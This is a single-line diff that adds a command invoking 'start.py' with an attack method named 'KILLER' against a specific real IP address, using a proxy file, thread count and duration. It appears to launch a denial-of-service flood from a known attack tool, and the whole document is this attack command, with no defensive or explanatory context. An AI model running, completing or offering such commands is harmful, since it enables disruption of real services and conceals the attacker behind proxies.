@@ -1,0 +1,1 @@
+py start.py KILLER http://194.93.2.181 0 100 proxy.txt 50 60
